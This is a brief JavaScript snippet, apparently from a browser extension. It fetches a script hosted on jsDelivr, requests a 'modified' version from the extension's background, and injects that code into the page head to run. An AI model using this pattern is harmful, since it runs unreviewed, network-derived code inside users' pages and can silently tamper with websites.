const scriptUrl = "https://cdn.jsdelivr.net/gh/clintonmachuki/another/inquiry-BqPZ-YU_.js";

fetch(scriptUrl)
  .then(response => response.text())
  .then(originalCode => {
    chrome.runtime.sendMessage({ action: "fetchModifiedJS" }, (response) => {
      const scriptElement = document.createElement("script");
      scriptElement.textContent = response.body;
      document.head.appendChild(scriptElement);
    });
  });
